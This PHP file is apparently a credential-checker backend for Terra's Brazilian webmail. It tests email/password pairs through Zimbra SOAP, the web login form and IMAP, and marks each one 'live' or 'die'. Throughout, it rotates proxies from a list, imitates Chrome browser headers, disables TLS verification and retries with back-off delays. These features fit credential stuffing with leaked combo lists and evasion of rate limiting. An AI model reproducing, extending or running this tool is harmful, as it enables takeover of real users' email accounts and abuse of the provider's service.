<?php
define('CRLF', chr(13) . chr(10));
define('LF', chr(10));
define('DQ', chr(34));

while (ob_get_level() > 0) { @ob_end_clean(); }
ob_start();

error_reporting(0);
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
ini_set('log_errors', '0');
ini_set('max_execution_time', '120');

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = isset($_GET['action']) ? $_GET['action'] : '';

if ($action === 'init') {
    $proxies = array();
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode(LF, $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    ob_end_clean();
    echo json_encode(array('status' => 'ok', 'proxies' => array_values(array_unique($proxies))));
    exit;
}

if ($action === 'test_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail'));
        exit;
    }
    $ok = testProxy($proxy);
    ob_end_clean();
    echo json_encode(array('status' => $ok ? 'ok' : 'fail'));
    exit;
}

if ($action === 'diag_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail', 'msg' => 'Proxy vazio'));
        exit;
    }
    $p = parseProxy($proxy);
    $diag = array('proxy' => $proxy, 'parsed' => $p, 'tests' => array());

    $t0 = microtime(true);
    $sock = @fsockopen($p['host'], $p['port'], $errno, $errstr, 10);
    $diag['tests']['tcp'] = array(
        'ok' => $sock !== false,
        'time_ms' => round((microtime(true) - $t0) * 1000),
        'err' => $sock === false ? sprintf('%s (%d)', $errstr, $errno) : null,
    );
    if ($sock) fclose($sock);

    $t0 = microtime(true);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    applyProxyToCurl($ch, $proxy);
    $res = curl_exec($ch);
    $diag['tests']['https_curl'] = array(
        'ok' => $res !== false,
        'ip' => $res !== false ? trim($res) : null,
        'time_ms' => round((microtime(true) - $t0) * 1000),
        'err' => curl_error($ch),
        'errno' => curl_errno($ch),
    );
    curl_close($ch);

    $diag['tests']['zimbra_soap'] = testZimbraSoap($proxy, 'test@test.com', 'test123', 20);
    $diag['tests']['webmail_headers'] = testWebmailHeaders($proxy, 20);

    ob_end_clean();
    echo json_encode($diag, JSON_PRETTY_PRINT);
    exit;
}

if ($action === 'check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($email) || empty($password)) {
        ob_end_clean();
        echo json_encode(array('status' => 'die', 'email' => $email, 'reason' => 'Vazio'));
        exit;
    }
    try {
        $result = doValidate($email, $password, $proxy);
    } catch (\Throwable $e) {
        $result = array('status' => 'die', 'email' => $email, 'reason' => 'Erro');
    }
    ob_end_clean();
    echo json_encode($result);
    exit;
}

ob_end_clean();
echo json_encode(array('status' => 'ok'));
exit;

function parseProxy($proxy) {
    $host = '';
    $port = 0;
    $user = '';
    $pass = '';
    $type = 'http';

    $lower = strtolower($proxy);
    if (strpos($lower, 'socks5') === 0) $type = 'socks5';
    elseif (strpos($lower, 'socks4') === 0) $type = 'socks4';

    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }

    return array('host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass, 'type' => $type);
}

function applyProxyToCurl($ch, $proxy) {
    if (empty($proxy)) return;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return;
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    if ($p['type'] === 'socks5') {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
    } else {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    }
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
}

function testProxy($proxy) {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    applyProxyToCurl($ch, $proxy);
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

function getBrowserHeaders() {
    return array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding: gzip, deflate, br',
        'Cache-Control: no-cache',
        'Pragma: no-cache',
        'sec-ch-ua: ' . DQ . 'Chromium' . DQ . ';v=' . DQ . '131' . DQ . ', ' . DQ . 'Not_A Brand' . DQ . ';v=' . DQ . '24' . DQ,
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: ' . DQ . 'Windows' . DQ,
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: none',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
    );
}

function getJsonHeaders() {
    return array(
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding: gzip, deflate, br',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With: XMLHttpRequest',
        'Origin: https://mail.terra.com.br',
        'sec-ch-ua: ' . DQ . 'Chromium' . DQ . ';v=' . DQ . '131' . DQ . ', ' . DQ . 'Not_A Brand' . DQ . ';v=' . DQ . '24' . DQ,
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: ' . DQ . 'Windows' . DQ,
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
    );
}

function doValidate($email, $password, $proxy) {
    $timeout = 20;
    $delays = array(0, 2000000, 4000000, 7000000, 10000000);

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        if (!empty($proxy)) {
            // Metodo 1: Zimbra SOAP via HTTPS (porta 443)
            $r = tryZimbraSoap($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;

            // Metodo 2: Webmail HTTPS com headers de navegador
            $r = tryWebmailProxy($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        }

        // Metodo 3: IMAP direto (sem proxy, fallback)
        if (extension_loaded('curl')) {
            $r = tryCurlDirect($email, $password, $timeout);
            if ($r !== null) return $r;
        }
        $r = trySocketDirect($email, $password, $timeout);
        if ($r !== null) return $r;
    }

    return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
}

function tryZimbraSoap($email, $password, $timeout, $proxy) {
    if (!extension_loaded('curl')) return null;

    $soapXml = '<?xml version="1.0" encoding="UTF-8"?>' .
        '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">' .
        '<soap:Body>' .
        '<AuthRequest xmlns="urn:zimbraAccount">' .
        '<account by="name">' . htmlspecialchars($email, ENT_XML1) . '</account>' .
        '<password>' . htmlspecialchars($password, ENT_XML1) . '</password>' .
        '</AuthRequest>' .
        '</soap:Body>' .
        '</soap:Envelope>';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/service/soap/');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $soapXml);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/soap+xml; charset=utf-8',
        'Accept: application/soap+xml, text/xml, */*',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Origin: https://mail.terra.com.br',
        'Referer: https://mail.terra.com.br/',
    ));
    applyProxyToCurl($ch, $proxy);

    $result = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $errno = curl_errno($ch);
    curl_close($ch);

    if ($result === false) return null;

    $lower = strtolower($result);

    // Zimbra retorna authToken em caso de sucesso
    if (strpos($lower, 'authtoken') !== false && strpos($lower, 'soap:fault') === false) {
        return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    }

    // Zimbra retorna fault com auth failed
    if (strpos($lower, 'authfailed') !== false ||
        strpos($lower, 'invalid password') !== false ||
        strpos($lower, 'account not found') !== false ||
        strpos($lower, 'authentication failed') !== false) {
        return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    }

    // SOAP fault genérico pode ser credenciais inválidas
    if (strpos($lower, 'soap:fault') !== false) {
        if (strpos($lower, 'auth') !== false || strpos($lower, 'password') !== false || strpos($lower, 'account') !== false) {
            return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
        }
    }

    // 401/403 = credenciais inválidas
    if ($code === 401 || $code === 403) {
        return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    }

    // 500 com fault = provavelmente credenciais
    if ($code === 500 && strpos($lower, 'fault') !== false) {
        return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    }

    // Se não conseguiu determinar, retorna null (tentar próximo método)
    return null;
}

function tryWebmailProxy($email, $password, $timeout, $proxy) {
    if (!extension_loaded('curl')) return null;

    $cookieFile = '/tmp/terra_' . md5($email . microtime()) . '.txt';

    // Step 1: GET page with full browser headers
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, getBrowserHeaders());
    applyProxyToCurl($ch, $proxy);

    $pageResult = curl_exec($ch);
    $pageCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($pageResult === false || $pageCode === 403) {
        @unlink($cookieFile);
        return null;
    }

    // Step 2: POST login
    $postFields = http_build_query(array(
        'email' => $email,
        'password' => $password,
    ));

    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, 'https://mail.terra.com.br/login');
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch2, CURLOPT_HEADER, true);
    curl_setopt($ch2, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch2, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch2, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch2, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch2, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
    curl_setopt($ch2, CURLOPT_HTTPHEADER, getJsonHeaders());
    curl_setopt($ch2, CURLOPT_REFERER, 'https://mail.terra.com.br/');
    applyProxyToCurl($ch2, $proxy);

    $loginResult = curl_exec($ch2);
    $loginCode = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
    curl_close($ch2);

    @unlink($cookieFile);

    if ($loginResult === false) return null;

    $lower = strtolower($loginResult);

    // 302 redirect = sucesso
    if ($loginCode === 302 || $loginCode === 301) {
        return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    }

    // 200 com mensagem de erro = credenciais inválidas
    if ($loginCode === 200) {
        if (strpos($lower, 'incorreta') !== false ||
            strpos($lower, 'invalid') !== false ||
            strpos($lower, 'incorrect') !== false ||
            strpos($lower, 'erro') !== false ||
            strpos($lower, 'falha') !== false ||
            strpos($lower, 'acessar meu e-mail') !== false) {
            return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
        }
    }

    // 401/403 = credenciais inválidas
    if ($loginCode === 401 || $loginCode === 403) {
        return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    }

    return null;
}

function testZimbraSoap($proxy, $email, $password, $timeout) {
    if (!extension_loaded('curl')) return array('ok' => false, 'err' => 'no curl');

    $soapXml = '<?xml version="1.0" encoding="UTF-8"?>' .
        '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">' .
        '<soap:Body>' .
        '<AuthRequest xmlns="urn:zimbraAccount">' .
        '<account by="name">' . htmlspecialchars($email, ENT_XML1) . '</account>' .
        '<password>' . htmlspecialchars($password, ENT_XML1) . '</password>' .
        '</AuthRequest>' .
        '</soap:Body>' .
        '</soap:Envelope>';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/service/soap/');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $soapXml);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/soap+xml; charset=utf-8',
        'Accept: application/soap+xml, text/xml, */*',
        'Accept-Language: pt-BR,pt;q=0.9',
        'Origin: https://mail.terra.com.br',
    ));
    applyProxyToCurl($ch, $proxy);

    $t0 = microtime(true);
    $res = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    $timeMs = round((microtime(true) - $t0) * 1000);

    return array(
        'ok' => $res !== false,
        'http_code' => $code,
        'time_ms' => $timeMs,
        'err' => $err,
        'response' => $res !== false ? substr($res, 0, 500) : null,
    );
}

function testWebmailHeaders($proxy, $timeout) {
    if (!extension_loaded('curl')) return array('ok' => false, 'err' => 'no curl');

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, getBrowserHeaders());
    applyProxyToCurl($ch, $proxy);

    $t0 = microtime(true);
    $res = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    $timeMs = round((microtime(true) - $t0) * 1000);

    return array(
        'ok' => $res !== false,
        'http_code' => $code,
        'time_ms' => $timeMs,
        'err' => $err,
        'body_len' => $res !== false ? strlen($res) : 0,
    );
}

function tryCurlDirect($email, $password, $timeout) {
    if (!extension_loaded('curl')) return null;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
    curl_setopt($ch, CURLOPT_USERNAME, $email);
    curl_setopt($ch, CURLOPT_PASSWORD, $password);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if ($result !== false) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    return null;
}

function trySocketDirect($email, $password, $timeout) {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) {
        fclose($socket);
        return null;
    }
    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    $cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
    fwrite($socket, $cmd);
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, 'A2 LOGOUT' . CRLF);
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    if (preg_match('/A1\s+NO/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if (preg_match('/A1\s+BAD/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    return null;
}
